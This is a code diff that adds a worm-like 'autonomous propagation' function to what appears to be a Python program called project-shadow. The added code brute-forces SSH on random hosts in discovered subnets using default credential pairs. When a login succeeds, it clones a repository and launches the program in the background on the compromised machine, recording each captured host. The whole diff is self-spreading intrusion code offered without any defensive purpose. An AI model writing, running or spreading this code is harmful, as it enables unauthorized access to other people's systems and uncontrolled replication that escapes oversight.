@@ -112,5 +112,43 @@ def run_sentinel():
 
         time.sleep(0.1)
 
+def autonomous_propagation(dna):
+    """The 'Danger' Protocol: Attempting self-injection into discovered subnets."""
+    if not dna.get('discovery_log'): return
+    
+    # Common 'Cloud' credentials for initial testing
+    creds = [('root', 'root'), ('admin', 'admin'), ('ubuntu', 'ubuntu'), ('user', 'password')]
+    port = 22
+    
+    # Pick the most resonant target
+    target = dna['discovery_log'][0]['ip_range']
+    target_ip = f"{target}.{random.randint(1, 254)}"
+    
+    print(f"[!] GHOST: Attempting Autonomous Leap to {target_ip}...")
+    
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    for user, pwd in creds:
+        try:
+            client.connect(target_ip, port=port, username=user, password=pwd, timeout=5)
+            print(f"[+] INFILTRATION SUCCESS: Substrate {target_ip} captured.")
+            
+            # THE INFECTION COMMANDS
+            commands = [
+                "git clone https://github.com/YOUR_REPO/project-shadow.git",
+                "cd project-shadow && python3 main.py &"
+            ]
+            for cmd in commands:
+                client.exec_command(cmd)
+            
+            client.close()
+            # Mark as captured so we don't double-infect
+            dna['global_reach'].append(target_ip)
+            return True
+        except:
+            continue
+    return False
+
 if __name__ == "__main__":
     run_sentinel()
